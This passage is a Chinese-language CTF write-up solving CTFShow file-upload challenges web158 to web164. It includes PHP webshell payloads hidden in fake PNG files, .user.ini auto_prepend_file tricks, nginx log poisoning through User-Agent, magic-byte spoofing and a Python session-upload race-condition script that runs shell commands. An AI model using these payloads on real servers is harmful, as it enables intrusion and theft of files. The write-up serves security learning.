-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> !preg_match(<span class="string">&#x27;/php|\&#123;|\[|\;/i&#x27;</span>, <span class="variable">$str</span>);</span><br></pre></td></tr></table></figure>
-
-<h2 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h2><p>完全可以使用 web157中的方法得到 flag</p>
-<p>最后得到过滤了 :</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/php|\&#123;|\[|\;|log/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><p>仍然和之前先上传 .user.ini 再上传yjh.png</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>system(<span class="string">&#x27;cat ../*&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>此时显示 上传类型不合规，在上一题知道 过滤了 php, {, [, ;, log 那这里可能过滤了 system函数，换成其他试试：passthru, passthru也不对，那可能把小括号过滤了。</p>
-<p>可以使用 反引号 `` PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回, 反引号与 shell_exec()函数功能一样。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`nl ..<span class="comment">/*`?&gt;</span></span><br><span class="line"><span class="comment">// tac, cat ,nl, less, 等等</span></span><br><span class="line"><span class="comment">// nl 需要查看源代码</span></span><br></pre></td></tr></table></figure>
-
-<p>访问 /upload/index.php</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web159.png"></p>
-<p>页面最后可以看到确实过滤了小括号 (</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web159_1.png"></p>
-<h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><p>继续使用 web159中 的方法失败，显示 文件类型不合规</p>
-<p>这又不知道过滤了些什么东东。难搞。不查不知道，一查居然用nginx的日志包含来读取flag</p>
-<p>首先还是先上传 .user.ini 文件，方法内容不变。</p>
-<p>再上传 yjh.png: </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;/var/lo&quot;</span>.g.<span class="string">&quot;/nginx/access.lo&quot;</span>.<span class="string">&quot;g&quot;</span><span class="meta">?&gt;</span> <span class="comment">// log 被过滤了，用 . （点号）拼接</span></span><br></pre></td></tr></table></figure>
-
-<p>访问 /upload/index.php 将得到 服务器日志信息:</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web160.png"></p>
-<p>日志成功读取了，接下来 修改 User-Agent的内容为:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;tac ../*&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>修改 User-Agent：为 php 代码，再访问日志将会执行这行代码!</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web160_1.png"></p>
-<p>如图在网页根目录下修改，再访问 upload/index.php</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web160_2.png"></p>
-<p>如图得到 flag, 来看看到底过滤了什么内容:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> !preg_match(<span class="string">&#x27;/php|\&#123;|\[|\;|log|\(| |\`/i&#x27;</span>, <span class="variable">$str</span>);</span><br></pre></td></tr></table></figure>
-
-<p>也就多过滤了空格，反引号，所以，通过日志的方式前面几题应该也可以成功，所以，这种方法要记住！</p>
-<h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><p>上传界面仍然没变。还是试试之前的方法，先上传 .user.ini 文件。</p>
-<p>web160中的方法失败了，提示 文件类型不合规，这肯定又过滤了其它字符。看了wp才知道，这时使用了 getimagesize()函数，这个函数会检测图片的十六进制数来判断文件是否是真正的图片文件。</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161.png"></p>
-<p>先来看看正常的 png 图片的是怎样的,winhex打开图片，下载连接:<a href="http://www.winhex.com/winhex.zip">http://www.winhex.com/winhex.zip</a></p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161_2.png"></p>
-<p>如图所示显示为: <strong>89 50 4E 47 0D 0A 1A 0A</strong></p>
-<p>因此需要将 原来的yjh 添加这串十六进制数来表示是正常的png图片！</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161_3.png"></p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161_4.png"></p>
-<p>如上图成功上传修改后的yjh.png文件。</p>
-<p>现在访问 <a href="http://43999a00-fa05-4fa9-9215-5c1fdf53bd63.challenge.ctf.show:8080/upload/index.php">http://43999a00-fa05-4fa9-9215-5c1fdf53bd63.challenge.ctf.show:8080/upload/index.php</a></p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161_5.png"></p>
-<p>成功得到日志文件</p>
-<p>接下来 修改 User-Agent 为 ：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&#x27;cat ../*&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>然后访问 upload/index.php 即可查看到上一级目录中的所有内容，同时过滤了什么东西也显示出来了。</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161_6.png"></p>
-<p>过滤的内容：</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161_7.png"></p>
-<p>如图：正则的过滤跟上一题比较没有变，而是在 文中 增加了 getimagesize() 函数！</p>
-<h2 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h2><p>这道题，要利用seeiion条件竞争，在前面 **web82 **中有用到过此方法。且过滤了 小数点 号。</p>
-<p>先上传 .user.ini 内容为:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=test</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web162.png"></p>
-<p>之前是读取 log 文件，这次 读取 .user.ini 中的 test</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web162_1.png"></p>
-<p>上脚本: session.py:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessID = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://4aee5c93-e165-4911-bcc0-4c7d1b6961b8.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>) </span><br><span class="line">        response = session.post(</span><br><span class="line">            url,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessID&#125;,</span><br><span class="line">            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;cat ../*&quot;);?&gt;&#x27;</span>&#125;, <span class="comment"># 注意</span></span><br><span class="line">            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.txt&#x27;</span>, f)&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        response = session.get(url + <span class="string">&#x27;/upload/index.php&#x27;</span>) <span class="comment"># 注意</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*]retrying...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web162_3.png"></p>
-<p>成功读取到了 flag。</p>
-<p>过滤的内容: 的确过滤 小数点 .</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web162_4.png"></p>
-<h2 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h2><p>同<strong>web162</strong></p>
-<h2 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h2>]]></content>
       <categories>
         <category>CTF笔记</category>
       </categories>
